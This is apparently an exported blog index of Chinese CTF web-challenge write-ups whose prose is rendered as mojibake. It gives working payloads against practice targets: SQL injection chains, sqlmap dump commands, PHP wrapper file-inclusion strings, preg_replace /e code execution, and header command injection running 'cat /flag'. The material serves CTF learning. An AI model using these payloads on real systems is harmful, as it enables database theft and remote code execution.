<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BJDCTF2020</title>
    <url>/2020/09/28/BJDCTF2020/</url>
    <content><![CDATA[<h1 id="BJDCTF-web"><a href="#BJDCTF-web" class="headerlink" title="BJDCTF-web"></a>BJDCTF-web</h1><a id="more"></a>

<h2 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy md5"></a>easy md5</h2><p>F12çœ‹åˆ°äº†æç¤ºï¼Œç»™å‡ºäº†sqlè¯­å¥</p>
<p><img src="/2020/09/28/BJDCTF2020/md5-1.png" srcset="/img/loading.gif" alt></p>
<div class="hljs"><pre><code class="hljs pgsql">Hint: <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'admin'</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">password</span>=md5($pass,<span class="hljs-keyword">true</span>)</code></pre></div>

<p>è¿™é‡Œæ˜¯å°†è¾“å…¥çš„å¯†ç è¿›è¡Œäº†ä¸€æ¬¡md5çš„åŠ å¯†</p>
<p><strong>md5()å‡½æ•°ä»‹ç»</strong></p>
<p><img src="/2020/09/28/BJDCTF2020/md5.png" srcset="/img/loading.gif" alt></p>
<p>è¿™é‡Œçš„å‚æ•°raw=true ï¼Œæ‰€ä»¥æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„å¯†ç åŠ å¯†16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼Œå¦‚æœæƒ³å®Œæˆæ³¨å…¥ï¼Œåˆ™md5å€¼ç»è¿‡hexè½¬æˆå­—ç¬¦ä¸²åä¸º â€˜orâ€™â€¦â€¦.è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œåªè¦å‡ºç°äº†orï¼Œä¸”oråé¢çš„å€¼ä¸ºçœŸå³å¯å®Œæˆæ³¨å…¥ã€‚</p>
<p><code>select * from &#39;admin&#39; where password=&#39; or &#39;sdaa</code></p>
<p>è¿™é‡Œç»å¸¸ä½¿ç”¨çš„å­—ç¬¦ä¸²æ˜¯<strong>ffifdyop</strong>ï¼Œè¯¥å­—ç¬¦ä¸²md5åŠ å¯†åè‹¥rawå‚æ•°ä¸ºTrueæ—¶ä¼šè¿”å› <strong>â€˜orâ€™6&lt;trash&gt;</strong> (&lt;trash&gt;å…¶å®å°±æ˜¯ä¸€äº›ä¹±ç å’Œä¸å¯è§å­—ç¬¦ï¼Œè¿™é‡Œåªè¦ç¬¬ä¸€ä½æ˜¯éé›¶æ•°å­—å³å¯è¢«åˆ¤å®šä¸ºTrueï¼Œåé¢çš„&lt;trash&gt;ä¼šåœ¨MySQLå°†å…¶è½¬æ¢æˆæ•´å‹æ¯”è¾ƒæ—¶ä¸¢æ‰)</p>
<p>æŸ¥è¯¢è¯­å¥ä¸º</p>
<p><code>select * from &#39;admin&#39; where password=&#39;or&#39;6&lt;trash&gt;&#39;</code>æ­¤æŸ¥è¯¢è¯­å¥ç»“æœä¸ºçœŸ</p>
<p>æäº¤ ffifdyopåä¼šè·³è½¬åˆ°å¦å¤–çš„é¡µé¢ï¼ŒæŸ¥çœ‹æºç </p>
<p><img src="/2020/09/28/BJDCTF2020/md5-2.png" srcset="/img/loading.gif" alt></p>
<p>è¿™é‡Œç›´æ¥åˆ©ç”¨md5()å‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„çš„ç‰¹æ€§ï¼Œgetæäº¤ <code>?a[]=1&amp;b[]=2</code></p>
<p>æ¥ä¸‹æ¥è¿˜æœ‰ä¸€æ¬¡è·³è½¬ï¼Œç›´æ¥post <code>param1[]=1&amp;param2[]=2</code>ï¼Œæ‹¿åˆ°flag</p>
<p><img src="/2020/09/28/BJDCTF2020/mdd5-3.png" srcset="/img/loading.gif" alt></p>
<h2 id="ä¸è¿‡å¦‚æ­¤"><a href="#ä¸è¿‡å¦‚æ­¤" class="headerlink" title="ä¸è¿‡å¦‚æ­¤"></a>ä¸è¿‡å¦‚æ­¤</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

error_reporting(<span class="hljs-number">0</span>);
$text = $_GET[<span class="hljs-string">"text"</span>]; <span class="hljs-comment">//get è·å–ä¸€ä¸ªå‚æ•°text ä½¿ç”¨dataä¼ªåè®®</span>
$file = $_GET[<span class="hljs-string">"file"</span>]; <span class="hljs-comment">//fileå‚æ•°ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨filterä¼ªåè®®è¯»å–phpé¡µé¢æºç </span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">'r'</span>)===<span class="hljs-string">"I have a dream"</span>))&#123;  <span class="hljs-comment">//text çš„å†…å®¹ä½I have a dream</span>
  <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="hljs-string">'r'</span>).<span class="hljs-string">"&lt;/h1&gt;&lt;/br&gt;"</span>;
  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/flag/"</span>,$file))&#123;                              <span class="hljs-comment">//fileå‚æ•°ä¸èƒ½åŒ…å«flag</span>
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Not now!"</span>);
  &#125;

  <span class="hljs-keyword">include</span>($file); <span class="hljs-comment">//next.php æç¤ºäº†ä¸‹ä¸€ä¸ªé¡µé¢çš„åå­— </span>

&#125;
<span class="hljs-keyword">else</span>&#123;
  highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>çœ‹åˆ°äº†fileå‚æ•°ï¼Œæƒ³åˆ°äº†æ–‡ä»¶åŒ…å«çš„æ¼æ´åˆ©ç”¨äºæ˜¯æ„é€ ä»¥ä¸‹çš„payload:</p>
<p><code>?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read/convert.base64-encode/resource=next.php</code></p>
<p>å¯¹åˆ°äº†index.phpé¡µé¢çš„base64æºç ï¼Œè§£ç åå¦‚ä¸‹</p>
<p>index.php</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$id = $_GET[<span class="hljs-string">'id'</span>];
$_SESSION[<span class="hljs-string">'id'</span>] = $id;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span><span class="hljs-params">($re, $str)</span> </span>&#123;
    <span class="hljs-keyword">return</span> preg_replace(
        <span class="hljs-string">'/('</span> . $re . <span class="hljs-string">')/ei'</span>,
        <span class="hljs-string">'strtolower("\\1")'</span>,
        $str
    );
&#125;


<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $re =&gt; $str) &#123;
    <span class="hljs-keyword">echo</span> complex($re, $str). <span class="hljs-string">"\n"</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span><span class="hljs-params">()</span></span>&#123;
	@<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'cmd'</span>]);
&#125;</code></pre></div>

<p>åˆ©ç”¨<strong>preg_replace()ä½¿ç”¨çš„/eæ¨¡å¼å¯ä»¥å­˜åœ¨è¿œç¨‹æ‰§è¡Œä»£ç </strong></p>
<p>åœ¨next.phpåœ¨è¾“å…¥</p>
<div class="hljs"><pre><code class="hljs awk"><span class="hljs-keyword">next</span>.php?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="hljs-string">"cat /flag"</span>);</code></pre></div>



<p><a href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener">phpä¼ªåè®®</a></p>
<p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">preg_replace /eæ¨¡å¼æ¼æ´è¯¦è§£</a></p>
<h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>è¿›å…¥é¡µé¢ä¸çŸ¥é“å¹²å•¥ï¼Œéšä¾¿ç‚¹ç‚¹ï¼Œåˆ°flag.phpæ—¶æ˜¾ç¤ºäº†IPåœ°å€</p>
<p>æŸ¥çœ‹åŸç å‘ç°æç¤º<code>&lt;!-- Do you know why i know your ip? --&gt;</code></p>
<p>çŒœæµ‹è¿™é‡Œæ˜¯è·ŸXFFæœ‰å…³ï¼Œäºæ˜¯ä¿®æ”¹XFF:127.0.0.1ï¼Œæœç„¶é¡µé¢æ˜¾ç¤ºçš„å°±æ˜¯IPæ˜¯127.0.0.1</p>
<p>è¿™é‡Œå°±æƒ³åˆ°äº†XFFæ³¨å…¥ï¼Œæ˜¯å¦å¯ä»¥ç±»ä¼¼äºXFFæ³¨å…¥ï¼Œå°†ç³»ç»Ÿåä»¤æ³¨å…¥è¿›å»</p>
<p>é¦–å…ˆè¯•è¯•<code>system(&quot;ls /&quot;)</code>,ä½†æ˜¯å‘ç°æ²¡æœ‰è¢«æ‰§è¡Œï¼Œäºæ˜¯å®¶ä¸Šæ‹¬å·<code>{system(&quot;ls /&quot;)}</code>ï¼Œè¿™æ¬¡æ‰§è¡ŒæˆåŠŸ</p>
<p> è·å–flag:</p>
<div class="hljs"><pre><code class="hljs clojure">&#123;system(<span class="hljs-string">"cat /flag"</span>)&#125;</code></pre></div>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>md5</tag>
        <tag>sql</tag>
        <tag>phpä¼ªåè®®</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku</title>
    <url>/2020/08/08/Bugku/</url>
    <content><![CDATA[<h1 id="Bugkuåˆ·é¢˜"><a href="#Bugkuåˆ·é¢˜" class="headerlink" title="Bugkuåˆ·é¢˜"></a>Bugkuåˆ·é¢˜</h1><a id="more"></a>

<h2 id="æˆç»©å•"><a href="#æˆç»©å•" class="headerlink" title="æˆç»©å•"></a>æˆç»©å•</h2><div class="hljs"><pre><code class="hljs html">1' and 1=1 #      
  
1' and 1=2 #</code></pre></div>
<p>   ä¸æ˜¾ç¤ºå†…å®¹ï¼Œå¯ä»¥åˆ¤æ–­å­˜åœ¨æ³¨å…¥ç‚¹</p>
<h2 id="æ‰‹å·¥æ³¨å…¥"><a href="#æ‰‹å·¥æ³¨å…¥" class="headerlink" title="æ‰‹å·¥æ³¨å…¥"></a>æ‰‹å·¥æ³¨å…¥</h2><h3 id="1-1-39-order-by-4-å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ"><a href="#1-1-39-order-by-4-å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ" class="headerlink" title="1.1&#39; order by 4#å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ"></a>1.<code>1&#39; order by 4</code>#å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ</h3><h3 id="2-çˆ†æ•°æ®åº“"><a href="#2-çˆ†æ•°æ®åº“" class="headerlink" title="2.çˆ†æ•°æ®åº“"></a>2.çˆ†æ•°æ®åº“</h3><div class="hljs"><pre><code>` -1&apos; union select 1,database(),3,4 #`

  database:skctf_flag</code></pre></div><h3 id="3-çˆ†å‡ºè¡¨å"><a href="#3-çˆ†å‡ºè¡¨å" class="headerlink" title="3.çˆ†å‡ºè¡¨å"></a>3.çˆ†å‡ºè¡¨å</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # </code></pre></div><p> table:fl4g,sc</p>
<h3 id="4-å­—æ®µå"><a href="#4-å­—æ®µå" class="headerlink" title="4.å­—æ®µå"></a>4.å­—æ®µå</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #</code></pre></div><p> skctf_flag</p>
<p> å¾—åˆ°flag</p>
<p> <code>(select skctf_flag from skctf_flag.fl4g)</code></p>
<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p> <strong>å› ä¸ºæœ¬é¢˜æäº¤æ•°æ®çš„æ–¹å¼ä¸ºpostï¼Œæ•…éœ€è¦å…ˆç”¨bpæŠ“æ•°æ®åŒ…ï¼Œä¿å­˜åˆ°sqlmapçš„è·¯å¾„ä¸­</strong></p>
<p><img src="/2020/08/08/Bugku/cjd1.png" srcset="/img/loading.gif" alt></p>
<h3 id="1-è·å–æ•°æ®åº“"><a href="#1-è·å–æ•°æ®åº“" class="headerlink" title="1.è·å–æ•°æ®åº“"></a>1.è·å–æ•°æ®åº“</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt --dbs</code></pre></div><p><img src="/2020/08/08/Bugku/cjd2.png" srcset="/img/loading.gif" alt></p>
<h3 id="2-è·å–è¡¨å"><a href="#2-è·å–è¡¨å" class="headerlink" title="2.è·å–è¡¨å"></a>2.è·å–è¡¨å</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag --tables</code></pre></div><p><img src="/2020/08/08/Bugku/cjd3.png" srcset="/img/loading.gif" alt></p>
<h3 id="3-è·å–åˆ—å"><a href="#3-è·å–åˆ—å" class="headerlink" title="3.è·å–åˆ—å"></a>3.è·å–åˆ—å</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns</code></pre></div><p><img src="/2020/08/08/Bugku/cjd4.png" srcset="/img/loading.gif" alt></p>
<h3 id="4-è·å–flag"><a href="#4-è·å–flag" class="headerlink" title="4.è·å–flag"></a>4.è·å–flag</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump</code></pre></div><p><img src="/2020/08/08/Bugku/cjd5.png" srcset="/img/loading.gif" alt></p>
<hr>
<h2 id="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"><a href="#å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯" class="headerlink" title="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"></a>å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯</h2><p> æ‰«æå‘ç°äº†index.phpï¼Œé€šè¿‡  index.php.bakä¸‹è½½ç½‘é¡µæºç </p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * Created by PhpStorm.</span>
<span class="hljs-comment"> * User: Norse</span>
<span class="hljs-comment"> * Date: 2017/8/6</span>
<span class="hljs-comment"> * Time: 20:22</span>
<span class="hljs-comment">*/</span>

<span class="hljs-keyword">include_once</span> <span class="hljs-string">"flag.php"</span>;
ini_set(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
$str = strstr($_SERVER[<span class="hljs-string">'REQUEST_URI'</span>], <span class="hljs-string">'?'</span>);
$str = substr($str,<span class="hljs-number">1</span>);
$str = str_replace(<span class="hljs-string">'key'</span>,<span class="hljs-string">''</span>,$str);
parse_str($str);
<span class="hljs-keyword">echo</span> md5($key1);

<span class="hljs-keyword">echo</span> md5($key2);
<span class="hljs-keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;
<span class="hljs-keyword">echo</span> $flag.<span class="hljs-string">"å–å¾—flag"</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>


<p> å¯¹ä¸Šä¼ çš„å€¼è¿›è¡Œäº†è¿‡æ»¤key, kekeyyå¯ä»¥ç»•è¿‡</p>
<p> 1.md5å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå°†ä¸¤ä¸ªå‚æ•°è®¾ç½®ä¸ºæ•°ç»„ç±»å‹ç»è¿‡md5å‡½æ•°åŠ å¯†åéƒ½ä¸ºNULLæ•…äºŒè€…ç›¸ç­‰<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p>
<p> 2.åˆ©ç”¨==æ¯”è¾ƒæ¼æ´</p>
<p> å¦‚æœä¸¤ä¸ªå­—ç¬¦ç»MD5åŠ å¯†åçš„å€¼ä¸º 0exxxxxå½¢å¼ï¼Œå°±ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”è¡¨ç¤ºçš„æ˜¯0*10çš„xxxxæ¬¡æ–¹ï¼Œè¿˜æ˜¯é›¶ï¼Œéƒ½æ˜¯ç›¸ç­‰çš„ã€‚</p>
<p> ä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯0eå¼€å¤´çš„ï¼š</p>
<div class="hljs"><pre><code>QNKCDZO

240610708

s878926199a

s155964671a

s214587387a

s214587387a</code></pre></div><hr>
<h2 id="å¤šæ¬¡"><a href="#å¤šæ¬¡" class="headerlink" title="å¤šæ¬¡"></a>å¤šæ¬¡</h2><p>çˆ†æ•°æ®åº“å</p>
<p>   <code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+</code></p>
<p>database:<strong>web1002-1</strong></p>
<p>çˆ†è¡¨å</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+</code></pre></div><p>flag1,hint</p>
<p>çˆ†å­—æ®µå</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos;  --+</code></pre></div><p>flag1,address<br>è·å–å†…å®¹</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+</code></pre></div><p><strong>usOwycTju+FTUUzXosjr</strong></p>
<p>æäº¤å‘ç°ä¸å¯¹</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+</code></pre></div><p>è·å–addressä¸­çš„å†…å®¹</p>
<p>./Once_More.php<br>ä¸‹ä¸€å…³åœ°å€<br>å¾—åˆ°å¦å¤–ä¸€ä¸ªåœ°å€</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23</code></pre></div><p>ç»™å‡ºæç¤º<br>XPATH syntax error: â€˜<del>class,flag2</del>â€˜</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23</code></pre></div><p>Unknown column â€˜flag2â€™ in â€˜where clauseâ€™</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23</code></pre></div><p>XPATH syntax error: â€˜<del>flag{Bugku-sql_6s-2i-4t-bug}</del>â€˜</p>
<p><strong>ï¼ï¼ï¼æ³¨æ„æŠŠflagæ”¹ä¸ºå°å†™å­—æ¯</strong></p>
<hr>
<h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p>é¶åœºï¼š<a href="é¶åœºï¼šhttp://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
<h3 id="ä¸€ã€æ‰‹å·¥æ³¨å…¥"><a href="#ä¸€ã€æ‰‹å·¥æ³¨å…¥" class="headerlink" title="ä¸€ã€æ‰‹å·¥æ³¨å…¥"></a>ä¸€ã€æ‰‹å·¥æ³¨å…¥</h3><p>ç¬¬ä¸€æ­¥</p>
<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code></pre></div><p>åŠ å•å¼•å·æŠ¥é”™</p>
<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,table_name from information_schema.tables where  table_schema=database()%23</code></pre></div><p>æŸ¥çœ‹æ‰€æœ‰çš„è¡¨</p>
<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(table_name) from information_schema.tables where  table_schema=database()%23</code></pre></div><p>æŸ¥çœ‹è¡¨ä¸­çš„åˆ—</p>
<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(column_name) from information_schema.columns where  table_name=0x637466 %23
ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre></div><p>0x637466 ä¸ºåå…­è¿›åˆ¶ctf</p>
<p>è·å–å­—æ®µå†…å®¹</p>
<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(pw) from ctf %23</code></pre></div><p><strong>flag:</strong><br><strong>nctf{h4cked_By_w00dPeck3r}</strong></p>
<h3 id="äºŒã€sqlmapæ³¨å…¥"><a href="#äºŒã€sqlmapæ³¨å…¥" class="headerlink" title="äºŒã€sqlmapæ³¨å…¥"></a>äºŒã€sqlmapæ³¨å…¥</h3><p>æ£€æµ‹æ˜¯å¦æœ‰æ³¨å…¥ç‚¹</p>
<p><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code><br>æ²¡æœ‰æˆåŠŸ<br>ä½¿ç”¨åå…­è¿›åˆ¶</p>
<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex</code></pre></div><p>è·å–æ•°æ®åº“å</p>
<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex
 --dbs //é€‰æ‹©åå…­è¿›åˆ¶ è·å–æ•°æ®åº“å å•å¼•å·ä½¿ç”¨urlç¼–ç </code></pre></div><p>è·å–è¡¨å</p>
<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex --D sae-chinalover --tables</code></pre></div><p>è·å–flag</p>
<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex -D sae-chinalover -T ctf --dump</code></pre></div><p><img src="/2020/08/08/Bugku/k1.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI</title>
    <url>/2020/08/16/SSTI/</url>
    <content><![CDATA[<p><img src="/2020/08/16/SSTI/SSTI%E6%A8%A1%E6%9D%BF.png" srcset="/img/loading.gif" alt><br><code>https://www.cnblogs.com/wangtanzhi/p/12238779.html</code></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>STTI</tag>
      </tags>
  </entry>
  <entry>
    <title>guestbook</title>
    <url>/2020/04/18/Guestbook/</url>
    <content><![CDATA[<h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb/?mod=new" target="_blank" rel="noopener">guestbook</a></h1><a id="more"></a>
<p>é¢˜ç›®æç¤ºï¼š<strong>This guestbook sucks. sqlmap is your friend.</strong> æ˜¯sqlæ³¨å…¥<br>ç‚¹å‡»Message List æ—¶æ˜¯ç©ºçš„ï¼Œ ç‚¹å‡»postæ˜¯å¯ä»¥æäº¤æ–°ä¿¡æ¯ï¼Œç‚¹å‡»æŸ¥çœ‹æ–°ä¿¡æ¯</p>
<p>åœ¨idå€¼ååŠ ä¸Šâ€ â€˜ â€œæµ‹è¯•æ˜¯å¦å­˜åœ¨æµ‹è¯•ç‚¹ç½‘é¡µæŠ¥é”™è¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹<br>union æ³¨å…¥!<br>æŸ¥çœ‹åˆ—</p>
<div class="hljs"><pre><code class="hljs perl">https:<span class="hljs-regexp">//hackme</span>.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=-<span class="hljs-number">1</span>%20union%20select%201,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%20<span class="hljs-comment">#</span>
//id=-<span class="hljs-number">1</span> æ˜¯è®©å‰é¢çš„å†…å®¹ä¸æ˜¾ç¤º</code></pre></div>
<p>3è¢«å›æ˜¾</p>
<p>1.æŸ¥çœ‹æ•°æ®åº“å</p>
<div class="hljs"><pre><code class="hljs perl">https:<span class="hljs-regexp">//hackme</span>.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=-<span class="hljs-number">1</span>%20union%20select%201,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>%20<span class="hljs-comment">#</span></code></pre></div>

<p>æ•°æ®åº“çš„åå­—<code>g8</code></p>
<p>2.æŸ¥çœ‹è¡¨å</p>
<div class="hljs"><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre></div>
<p>å‘ç°æœ‰ä¸€ä¸ªè¡¨ <code>flag</code></p>
<p>3.æµ‹è¯•è¡¨çš„å­—æ®µ</p>
<div class="hljs"><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">'flag'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre></div>
<p>ä»ç„¶æ˜¾ç¤º<code>flag</code></p>
<p>4.è¯»å–flag   </p>
<div class="hljs"><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre></div>

<p>å¾—åˆ°flag!</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sqlæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku1-10</title>
    <url>/2020/09/06/bugku1-10/</url>
    <content><![CDATA[<h1 id="bugkuåˆ·é¢˜è®°å½•1"><a href="#bugkuåˆ·é¢˜è®°å½•1" class="headerlink" title="bugkuåˆ·é¢˜è®°å½•1"></a>bugkuåˆ·é¢˜è®°å½•1</h1><a id="more"></a>



<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>æŸ¥çœ‹æºç å³å¯</p>
<h2 id="è®¡ç®—å™¨"><a href="#è®¡ç®—å™¨" class="headerlink" title="è®¡ç®—å™¨"></a>è®¡ç®—å™¨</h2><p>ä¿®æ”¹å‰ç«¯ä»£ç </p>
<p><img src="/2020/09/06/bugku1-10/%E8%AE%A1%E7%AE%97%E5%99%A8.png" srcset="/img/loading.gif" alt></p>
<h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>payload:</p>
<p><code>?what=flag</code></p>
<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p><img src="/2020/09/06/bugku1-10/post.png" srcset="/img/loading.gif" alt></p>
<h2 id="çŸ›ç›¾"><a href="#çŸ›ç›¾" class="headerlink" title="çŸ›ç›¾"></a>çŸ›ç›¾</h2><p>payload: <code>?num=1a</code></p>
<p>è€ƒå¯Ÿç‚¹ï¼šå¼±ç±»å‹æ¯”è¾ƒ</p>
<blockquote>
<p>=== åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²çš„ç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Œå†æ¯”è¾ƒ</p>
<p>== åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒï¼Œå†æ¯”è¾ƒ</p>
</blockquote>
<p>æµ‹è¯•ä»£ç </p>
